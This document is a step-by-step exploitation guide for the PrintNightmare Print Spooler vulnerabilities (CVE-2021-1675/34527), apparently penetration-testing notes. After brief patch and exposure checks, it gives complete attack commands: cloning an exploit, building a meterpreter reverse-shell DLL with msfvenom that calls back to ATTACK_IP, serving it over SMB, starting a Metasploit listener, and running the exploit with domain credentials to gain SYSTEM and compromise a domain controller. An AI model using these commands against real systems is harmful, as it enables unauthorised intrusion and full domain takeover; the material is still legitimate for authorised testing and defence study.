**PrintNightmare** is the name given to two critical vulnerabilities affecting the **Windows Print Spooler service** (`spoolsv.exe`).

- **CVE‑2021‑1675** → Privilege Escalation / RCE via printer driver installation
    
- **CVE‑2021‑34527** → Remote Code Execution through Print Spooler RPC
    

The Print Spooler runs by default on almost all Windows systems, including **Domain Controllers**, making it highly dangerous inside Active Directory environments.

Successful exploitation allows:

- Local Privilege Escalation → SYSTEM
    
- Remote Code Execution
    
- Domain Controller compromise from a standard domain user
    

---

## Vulnerable versions (unpatched)

- Windows Server 2012 / 2012 R2
    
- Windows Server 2016
    
- Windows Server 2019
    
- Windows Server 2022 (early builds)
    
- Windows 10 (multiple builds before July 2021 patches)


### Check installed patches (Windows)

```powershell
wmic qfe | find "5004945"
```

or:

```powershell
Get-HotFix
```

If July 2021 security updates are missing → likely vulnerable.

---

## Verify Print Spooler Status

```powershell
Get-Service Spooler
```

If running:

```
Status : Running
```

Target may be exploitable.

---

## Enumerating Exposure (Linux)

Check if printer RPC protocols are exposed:

```bash
rpcdump.py @TARGET_IP | egrep 'MS-RPRN|MS-PAR'
```

Expected vulnerable output:

```
MS-RPRN  Print System Remote Protocol
MS-PAR   Print System Asynchronous Remote Protocol
```

---

## Attack Concept

The vulnerability abuses printer driver installation.

Attack flow:

1. Attacker hosts a malicious DLL.
    
2. Print Spooler requests a printer driver.
    
3. Target downloads attacker DLL via SMB.
    
4. DLL executes as SYSTEM.
    
5. Attacker obtains privileged shell.
    

---

## Requirements

- Valid domain credentials (standard user sufficient)
    
- Print Spooler enabled
    
- SMB reachable from target
    
- Vulnerable patch level
    

---

## Exploit Setup

**Clone exploit**

```bash
git clone https://github.com/cube0x0/CVE-2021-1675.git
```

**Install compatible Impacket**

```bash
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 setup.py install
```

---

## Create Malicious DLL Payload

Example reverse shell:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=ATTACK_IP LPORT=8080 -f dll > payload.dll
```

---

## Host Payload via SMB

```bash
sudo smbserver.py -smb2support ShareName /path/payload.dll
```

Target will later load:

```
\\ATTACK_IP\ShareName\payload.dll
```

---

## Start Listener (Metasploit)

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST ATTACK_IP
set LPORT 8080
run
```

---

## Execute Exploit

```bash
sudo python3 CVE-2021-1675.py \
DOMAIN/user:password@TARGET_IP \
'\\ATTACK_IP\ShareName\payload.dll'
```

What happens internally:

- RPC connection to `\PIPE\spoolss`
    
- Driver path abuse
    
- Remote DLL execution
    
- SYSTEM context obtained
    

---

## Successful Exploitation

Listener receives connection:

```
Meterpreter session opened
```

Verify privileges:

```cmd
whoami
```

Output:

```
nt authority\system
```

If executed on a Domain Controller → full domain compromise path.
